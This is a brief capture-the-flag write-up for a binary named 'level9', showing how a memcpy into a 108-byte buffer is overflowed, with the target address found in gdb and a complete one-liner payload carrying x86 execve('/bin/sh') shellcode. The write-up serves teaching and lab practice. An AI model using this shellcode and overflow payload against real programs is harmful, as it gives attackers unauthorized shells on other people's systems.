@@ -1,0 +1,15 @@
+Buffer Overflow
+
+With a decompiler (ghidra, hopper, etc...) we can see that there is a call to
+SetAnnotation function under the main with argv[1] as parameter.
+In that function there is a memcpy of the param into a buffer[108] and returns
+the return of memcpy which is the begining of the buffer where data is copied.
+
+Under gdb we can get that address by putting a breakpoint just after the call 
+of SetAnnotation and printing $eax (x/32x $eax), we find 0x0804a00c
+
+When we try to do a buffer overflow "38_char_SHELLCODE" + "\x90"*70 + "0x0804a00c"
+we see with gdb that the program trys to jump at address of the 4 first bytes of
+our shellcode so the solution is:
+
+./level9 $(python -c 'print "\x08\x04\xa0\x1c"[::-1] + "\x90"*66 + "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x08\x04\xa0\x0c"[::-1]')
